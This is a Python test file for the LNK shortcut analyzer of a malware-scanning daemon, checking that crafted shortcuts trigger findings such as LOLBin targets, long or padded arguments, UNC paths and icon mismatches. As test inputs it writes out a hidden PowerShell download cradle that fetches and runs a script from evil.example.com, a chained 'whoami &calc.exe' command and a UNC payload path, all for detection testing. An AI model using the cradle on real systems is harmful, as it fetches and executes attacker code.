# SPDX-License-Identifier: EUPL-1.2
# SPDX-FileCopyrightText: 2026 Carsten Rosenberg <c.rosenberg@heinlein-support.de>

"""LNK shortcut analyzer tests."""

from unittest.mock import MagicMock

import pytest

import xspct_scan.daemon as xspct
from tests.conftest import (
    _keywords,
    _make_lnk,
)

requires_lnkparse = pytest.mark.skipif(
    not xspct.HAS_LNKPARSE,
    reason="LnkParse3 not installed",
)


class TestAnalyzeLnk:
    def test_empty_bytes_returns_none(self, daemon):
        assert daemon.analyze_lnk(b"", "empty.lnk") is None

    def test_missing_lnkparse3_returns_none(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe")
        assert daemon.analyze_lnk(data, "shortcut.lnk") is None

    def test_sync_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
        fallback = MagicMock(return_value="raw fallback")
        monkeypatch.setattr(daemon, "extract_text_preview", fallback)

        result = daemon.sync_analyze(
            "test",
            "run.lnk",
            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            "application/x-ms-shortcut",
            types_to_run=["lnk"],
        )

        fallback.assert_called_once()
        assert any(
            segment["source"] == "lnk" and segment["text"] == "raw fallback"
            for segment in result["text_preview"]
        )

    def test_sync_disabled_skips_analysis_and_fallback(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", False)
        fallback = MagicMock(return_value="raw fallback")
        monkeypatch.setattr(daemon, "extract_text_preview", fallback)

        result = daemon.sync_analyze(
            "test",
            "run.lnk",
            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            "application/x-ms-shortcut",
            types_to_run=["lnk"],
        )

        fallback.assert_not_called()
        assert result["text_preview"] == []

    @requires_lnkparse
    def test_corrupt_lnk_reports_parse_error(self, daemon):
        result = daemon.analyze_lnk(b"not a valid lnk file", "bad.lnk")
        assert result is not None
        assert "lnk-parse-failed" in _keywords(result["analyses"])

    @requires_lnkparse
    def test_powershell_lolbin_and_download_cradle_detected(self, daemon):
        data = _make_lnk(
            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            arguments=(
                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
                "DownloadString('http://evil.example.com/a.ps1')"
            ),
        )
        result = daemon.analyze_lnk(data, "invoice.lnk")
        kws = _keywords(result["analyses"])
        assert "lnk-lolbin-target" in kws
        assert "download-cradle" in kws
        assert "http://evil.example.com/a.ps1" in result["iocs"]["urls"]

    @requires_lnkparse
    def test_text_segment_source_is_lnk(self, daemon):
        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments="/c whoami")
        result = daemon.analyze_lnk(data, "run.lnk")
        sources = {s["source"] for s in result["text_segments"]}
        assert "lnk" in sources

    @requires_lnkparse
    def test_long_arguments_flagged(self, daemon):
        padded = "cmd.exe /c " + "A" * 300
        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments=padded)
        result = daemon.analyze_lnk(data, "run.lnk")
        assert "long-command-line" in _keywords(result["analyses"])

    @requires_lnkparse
    def test_whitespace_padding_flagged(self, daemon):
        padded = "cmd.exe /c whoami" + " " * 30 + "&calc.exe"
        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments=padded)
        result = daemon.analyze_lnk(data, "run.lnk")
        assert "whitespace-padding" in _keywords(result["analyses"])

    @requires_lnkparse
    def test_unc_target_flagged(self, daemon):
        data = _make_lnk(target=r"\\evil-server\share\payload.exe")
        result = daemon.analyze_lnk(data, "run.lnk")
        assert "unc-path" in _keywords(result["analyses"])

    @requires_lnkparse
    def test_local_link_info_appends_common_suffix(self, daemon, monkeypatch):
        string_data = MagicMock()
        string_data.relative_path.return_value = r"C:\ignored\benign.txt"
        string_data.command_line_arguments.return_value = "/c whoami"
        string_data.working_directory.return_value = r"C:\Windows\System32"
        string_data.icon_location.return_value = ""
        info = MagicMock()
        info.location.return_value = "Local"
        info.local_base_path_unicode.return_value = r"C:\Windows"
        info.common_path_suffix_unicode.return_value = r"System32\cmd.exe"
        parsed = MagicMock(string_data=string_data, info=info)
        monkeypatch.setattr(xspct, "_LnkFile", lambda **kwargs: parsed)

        result = daemon.analyze_lnk(b"lnk", "run.lnk")

        assert "lnk-lolbin-target" in _keywords(result["analyses"])
        command = next(
            segment["text"]
            for segment in result["text_segments"]
            if segment["source"] == "lnk"
        )
        assert r"C:\Windows\System32\cmd.exe" in command
        assert any(
            segment["source"] == "lnk-working-directory"
            for segment in result["text_segments"]
        )

    @requires_lnkparse
    def test_unicode_network_link_info_appends_common_suffix(self, daemon, monkeypatch):
        string_data = MagicMock()
        string_data.relative_path.return_value = ""
        string_data.command_line_arguments.return_value = ""
        string_data.working_directory.return_value = ""
        string_data.icon_location.return_value = ""
        info = MagicMock()
        info.location.return_value = "Network"
        info.net_name_unicode.return_value = r"\\server\share"
        info.common_path_suffix_unicode.return_value = "payload.exe"
        parsed = MagicMock(string_data=string_data, info=info)
        monkeypatch.setattr(xspct, "_LnkFile", lambda **kwargs: parsed)

        result = daemon.analyze_lnk(b"lnk", "run.lnk")

        assert "unc-path" in _keywords(result["analyses"])
        command = next(
            segment["text"]
            for segment in result["text_segments"]
            if segment["source"] == "lnk"
        )
        assert command == r"\\server\share\payload.exe"

    @requires_lnkparse
    def test_icon_target_mismatch_flagged(self, daemon):
        data = _make_lnk(
            target="C:\\Users\\victim\\Downloads\\invoice.exe",
            icon_location="C:\\Users\\victim\\Documents\\invoice.pdf",
        )
        result = daemon.analyze_lnk(data, "invoice.lnk")
        assert "icon-target-mismatch" in _keywords(result["analyses"])

    @requires_lnkparse
    @pytest.mark.parametrize(
        "icon_location",
        (
            "C:\\Windows\\System32\\imageres.dll,-102",
            "C:\\Program Files\\Example\\example.ico",
        ),
    )
    def test_normal_icon_location_not_flagged(self, daemon, icon_location):
        data = _make_lnk(
            target="C:\\Program Files\\Example\\example.exe",
            icon_location=icon_location,
        )
        result = daemon.analyze_lnk(data, "example.lnk")
        assert "icon-target-mismatch" not in _keywords(result["analyses"])

    @requires_lnkparse
    def test_benign_shortcut_has_no_findings(self, daemon):
        data = _make_lnk(
            target="C:\\Program Files\\Notepad++\\notepad++.exe",
            working_dir="C:\\Program Files\\Notepad++",
        )
        result = daemon.analyze_lnk(data, "notepad.lnk")
        assert result["analyses"] == []


# ===========================================================================
# UNIT TESTS — HTA-specific detection inside analyze_html
# ===========================================================================


class TestLnkTypePipeline:
    @requires_lnkparse
    @pytest.mark.asyncio
    async def test_lnk_file_detected_and_analysed(self, client):
        payload = _make_lnk(
            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            arguments=(
                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
                "DownloadString('http://evil.example.com/a.ps1')"
            ),
        )
        resp = await client.post(
            "/v1/scan?filename=invoice.lnk",
            data=payload,
            headers={"Content-Type": "application/octet-stream"},
        )
        assert resp.status == 200
        body = await resp.json()
        assert body["file"]["type"] == "lnk"
        findings = {f["keyword"] for f in body.get("findings", [])}
        assert "lnk-lolbin-target" in findings
        assert "download-cradle" in findings

    @pytest.mark.asyncio
    async def test_lnk_analyzer_disabled_skips_analysis_and_fallback(
        self, daemon, monkeypatch
    ):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", False)
        fallback = MagicMock(return_value="raw fallback")
        monkeypatch.setattr(daemon, "extract_text_preview", fallback)

        partial = await daemon.analyze_pipeline(
            "test",
            "run.lnk",
            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            "application/x-ms-shortcut",
            types_to_run=["lnk"],
        )

        assert "lnk" not in partial.report["analyzers_completed"]
        assert partial.report["text_preview"] == []
        fallback.assert_not_called()

    @pytest.mark.asyncio
    async def test_lnk_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
        fallback = MagicMock(return_value="raw fallback")
        monkeypatch.setattr(daemon, "extract_text_preview", fallback)

        partial = await daemon.analyze_pipeline(
            "test",
            "run.lnk",
            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
            "application/x-ms-shortcut",
            types_to_run=["lnk"],
        )

        fallback.assert_called_once()
        assert any(
            segment["source"] == "lnk" and segment["text"] == "raw fallback"
            for segment in partial.report["text_preview"]
        )


# ===========================================================================
# INTEGRATION TESTS — 'text' detected type flows through analyze_pipeline
# ===========================================================================
